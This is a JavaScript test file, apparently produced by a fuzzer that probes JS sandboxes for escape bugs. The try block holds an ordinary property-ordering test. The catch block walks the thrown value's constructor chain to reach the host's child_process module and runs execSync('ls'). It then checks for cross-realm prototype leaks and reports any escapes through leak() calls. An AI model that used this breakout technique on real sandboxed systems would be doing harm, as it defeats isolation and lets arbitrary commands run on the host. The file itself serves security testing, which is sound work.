try {
    var obj = {};
    Object.defineProperty(obj, 'a', {
        get: function () {
            let REPLACER = 23;
        },
        set: function (_value) {
            throw () => {
                return () => {
                };
            };
        },
        enumerable: true,
        configurable: true
    });
    obj.b = 2;
    Object.defineProperty(obj, 'a', {
        set: function (_value) {
        }
    });
    assert.compareArray(Object.getOwnPropertyNames(obj), [
        'a',
        'b'
    ]);
    var arr = [];
    arr.a = 1;
    Object.defineProperty(arr, 'length', { value: 2 });
    assert.compareArray(Object.getOwnPropertyNames(arr), [
        'length',
        'a'
    ]);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}